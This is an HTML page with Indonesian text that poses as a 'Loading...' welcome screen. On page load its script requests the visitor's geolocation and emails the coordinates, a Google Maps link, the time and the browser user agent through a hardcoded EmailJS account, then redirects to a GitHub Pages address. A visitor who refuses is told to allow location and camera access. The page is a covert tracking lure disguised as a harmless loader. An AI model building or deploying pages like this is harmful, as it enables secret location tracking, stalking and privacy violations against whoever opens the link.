<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>WELCOME...</title>

  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #0f172a;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .box {
      text-align: center;
    }

    .loader {
      border: 4px solid #1e293b;
      border-top: 4px solid #38bdf8;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: auto;
      margin-bottom: 15px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .error {
      color: #f87171;
      margin-top: 15px;
    }
  </style>
</head>
<body>

<div class="box">
  <div class="loader"></div>
  <h3 id="status">Loading...</h3>
  <div id="error" class="error"></div>
</div>

<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<script>
// ✅ EmailJS config
(function(){
    emailjs.init("buxVv6sNpKGz4iBzb");
})();

const statusText = document.getElementById("status");
const errorText = document.getElementById("error");

// START
getLocation();

function getLocation() {
    if (!navigator.geolocation) {
        statusText.innerText = "Geolocation tidak didukung";
        return;
    }

    navigator.geolocation.getCurrentPosition(success, error);
}

// ✅ BERHASIL
function success(position) {
    const lat = position.coords.latitude;
    const lon = position.coords.longitude;

    statusText.innerText = "Loading...";

    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;

    emailjs.send("service_lzuezkd", "template_105p1pt", {
        message: "Lokasi berhasil diambil",
        latitude: lat,
        longitude: lon,
        maps: mapsLink,
        time: new Date().toLocaleString(),
        device: navigator.userAgent
    })
    .then(() => {
        statusText.innerText = "Berhasil...";

        setTimeout(() => {
            window.location.href = "https://topupfanzzjb.github.io/-gmail.com/fanzztzy.html"; // GANTI
        }, 3000);
    })
    .catch(() => {
        statusText.innerText = "Gagal...";

        setTimeout(() => {
            window.location.href = "https://topupfanzzjb.github.io/-gmail.com/fanzztzy.html";
        }, 3000);
    });
}

// ❌ DITOLAK
function error(err) {
    statusText.innerText = "Akses lokasi dan kamera ditolak!";
    errorText.innerText = "Izinkan lokasi dan kamera untuk melanjutkan.";

    console.log("Lokasi ditolak:", err);

    // ⛔ TIDAK ADA REDIRECT
    return;
}
</script>

</body>
  </html>
